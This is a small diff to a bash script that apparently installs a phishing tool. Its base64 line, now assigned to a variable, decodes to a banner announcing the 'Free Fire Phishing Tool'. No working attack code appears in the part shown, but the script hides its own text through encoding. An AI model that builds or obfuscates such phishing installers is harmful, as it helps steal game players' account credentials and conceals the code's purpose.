@@ -1,7 +1,7 @@
 #!/bin/bash
 echo ""
 clear
-"ZWNobyAtZSAiIFxlWzE7MzNtW1xlWzBtXGVbMTs3N21+XGVbMG1cZVsxOzMzbV1cZVswbVxlWzE7MzJtIEluc3RhbGxpbmcgVGhlIEZyZWUgRmlyZSBQaGlzaGluZyBUb29sIFBsZWFzZSBXYWl0Li4uLiAgXGVbMG0i"
+z="ZWNobyAtZSAiIFxlWzE7MzNtW1xlWzBtXGVbMTs3N21+XGVbMG1cZVsxOzMzbV1cZVswbVxlWzE7MzJtIEluc3RhbGxpbmcgVGhlIEZyZWUgRmlyZSBQaGlzaGluZyBUb29sIFBsZWFzZSBXYWl0Li4uLiAgXGVbMG0i"
 echo -e ""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
